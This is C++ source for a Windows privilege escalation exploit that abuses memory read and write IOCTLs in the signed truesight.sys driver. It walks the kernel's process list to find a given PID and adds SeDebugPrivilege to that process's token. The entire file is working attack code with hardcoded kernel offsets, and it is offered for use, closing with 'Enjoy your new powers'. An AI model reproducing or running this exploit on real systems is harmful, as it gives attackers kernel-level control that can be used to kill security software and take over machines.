#include "KernelReadWrite.h"
#include "Privileges.h"

#include <iostream>
#include <Psapi.h>
#include <tchar.h>
#include <stdio.h>

//
// Abuses the truesight.sys signed driver to elevate privileges of a process to NT AUTHORITY/SYSTEM
// Uses two IOCTLs, which straight-up give memory read/write primitives
// 
// Credit to https://github.com/MaorSabag/TrueSightKiller/tree/main for exposing the driver:)
//

void RaiseError(const char* Message) {
	auto le = GetLastError();
	std::cerr << Message;
	if (le) {
		LPSTR messageBuffer = nullptr;

		//Ask Win32 to give us the string version of that message ID.
		//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
		size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, le, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

		//Copy the error message into a std::string.
		std::string message(messageBuffer, size);

		//Free the Win32's string's buffer.
		LocalFree(messageBuffer);

		std::cerr << ". Windows error code: " << le << ", (" << message << ")";
	}
	std::cerr << std::endl;
	exit(-1);
}

class TrueSightRw : public IKernelReadWrite {
public:
	TrueSightRw() : m_Handle(0) {
		m_Handle = CreateFileA("\\\\.\\TrueSight", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (m_Handle == INVALID_HANDLE_VALUE) {
			RaiseError("CreateFileA");
		}
	}

	std::vector<BYTE> ReadBuffer(PVOID Address, ULONG Size) override {
		constexpr ULONG MemoryReadIoctl = 0x22E050;

		struct {
			PVOID TargetAddress;
			ULONG OutputLength;
		} memoryReadParameters = { Address, Size };

		static_assert(sizeof(memoryReadParameters) == 0x10, "Incorrect size of read parameters");

		auto* outputBuffer = new BYTE[Size];

		if (!DeviceIoControl(m_Handle, MemoryReadIoctl, &memoryReadParameters, sizeof(memoryReadParameters), outputBuffer, Size, nullptr, nullptr)) {
			RaiseError("DeviceIoControl(MemoryReadIoctl) Failed");
		}

		std::vector<BYTE> result(outputBuffer, outputBuffer + Size);
		return result;
	}

	Qword ReadQword(PVOID Address) {
		std::vector<BYTE> buffer = this->ReadBuffer(Address, sizeof(Qword));
		auto result = *reinterpret_cast<Qword*>(buffer.data());
		return result;
	}
	
	void WriteQword(PVOID Address, Qword Value) {
		constexpr ULONG MemoryWriteIoctl = 0x22E014;

		//
		// Paramters for MemoryWriteIoctl.
		//
		struct {
			PVOID TargetAddress;
			ULONG Zero;
			Qword Value;
		} memoryWriteParamters = { (PBYTE)Address - 8 * 14, 0, Value };

		static_assert(sizeof(memoryWriteParamters) == 0x18, "Incorrect size of write parameters");

		if (!DeviceIoControl(m_Handle, MemoryWriteIoctl, &memoryWriteParamters, sizeof(memoryWriteParamters), nullptr, 0, nullptr, nullptr)) {
			RaiseError("DeviceIoControl(MemoryWriteIoctl) Failed");
		}
	}

	~TrueSightRw() {
		if (m_Handle != INVALID_HANDLE_VALUE) {
			CloseHandle(m_Handle);
		}
	}

private:
	HANDLE m_Handle;
};


PBYTE GetKernelBase() {

	// the first driver is ntoskrnl

	PVOID firstDriver = nullptr;
	DWORD driversSize = 0;
	EnumDeviceDrivers(&firstDriver, sizeof(PVOID), &driversSize);

	return (PBYTE)firstDriver;
}


//
// Offsets from start of EPROCESS
//

constexpr ULONG c_TokenOffset = 0x4b8;
constexpr ULONG c_ProcessIdOffset = 0x440;
constexpr ULONG c_ProcessLinksOffset = 0x448;

//
// Offset of system process pointer from kernel start
//
constexpr ULONG c_PsInitialSystemProcess = 0xcfc420;

//
// Token privileges (i.e SEP_PROCESS_PRIVILEGES), shortened to exclude EnabledByDefault
//
struct ShortenedPrivileges
{
	ULONGLONG Present;
	ULONGLONG Enabled;
	// ULONGLONG EnabledByDefault;
};

// offset of SEP_TOKEN_PRIVILEGES from TOKEN
constexpr ULONG c_PrivilegesOffset = 0x40;

void AddPrivilegesToToken(PBYTE Token, ULONGLONG NewPrivileges, IKernelReadWrite* Rw) {
	PBYTE pPrivileges = Token + c_PrivilegesOffset;

	ShortenedPrivileges privileges = { 0 };
	Rw->ReadType<ShortenedPrivileges>(pPrivileges, &privileges);

	// add new privileges
	privileges.Enabled |= NewPrivileges;
	privileges.Present |= NewPrivileges;

	// write back
	// really should create WriteType but nah this works too

	Rw->WriteQword(pPrivileges, privileges.Present);
	Rw->WriteQword(pPrivileges + FIELD_OFFSET(ShortenedPrivileges, Enabled), privileges.Enabled);
}

bool ElevatePrivileges(DWORD Id, PBYTE KernelBase, IKernelReadWrite* Rw) {

	// Copy SYSTEM token from SYSTEM process

	auto* systemProcess = (PBYTE)Rw->ReadQword(KernelBase + c_PsInitialSystemProcess);
	//auto systemToken = Rw->ReadQword(systemProcess + c_TokenOffset);

	// Find our process by its id

	auto* listHead = systemProcess + c_ProcessLinksOffset;
	auto* curr = (PBYTE)Rw->ReadQword(listHead);
	while (curr != listHead) {
		auto* process = curr - c_ProcessLinksOffset;
		auto processId = Rw->ReadQword(process + c_ProcessIdOffset);
		if (processId == Id) {
			std::cout << "[+] Found process at 0x" << std::hex << (Qword)process << std::endl;

			//
			// elevating privileges, let's try to give ourselves SeCreateTokenPrivilege
			//

			auto token = Rw->ReadQword(process + c_TokenOffset);
			// zero out ref-count
			token &= ~0xf;

			AddPrivilegesToToken((PBYTE)token, SeDebugPrivilege, Rw);
			return true;
		}
		// go to next process
		curr = (PBYTE)Rw->ReadQword(curr);
	}
	return false;
}


int main(int argc, char* argv[]) {
	if (argc < 2) {
		RaiseError("usage: TrueSightDemolisher.exe PID");
	}
	
	DWORD processId = std::strtoul(argv[1], nullptr, 10);
	auto* kernelBase = GetKernelBase();

	std::cout << "[+] Kernel base: 0x" << std::hex << (Qword)kernelBase << std::endl;
	
	TrueSightRw rw;
	auto succeded = ElevatePrivileges(processId, kernelBase, &rw);
	if (!succeded) {
		RaiseError("[-] Failed to elevate privileges. Maybe the process is not up?");
	}
	std::cout << "[+] Enjoy your new powers:)" << std::endl;
}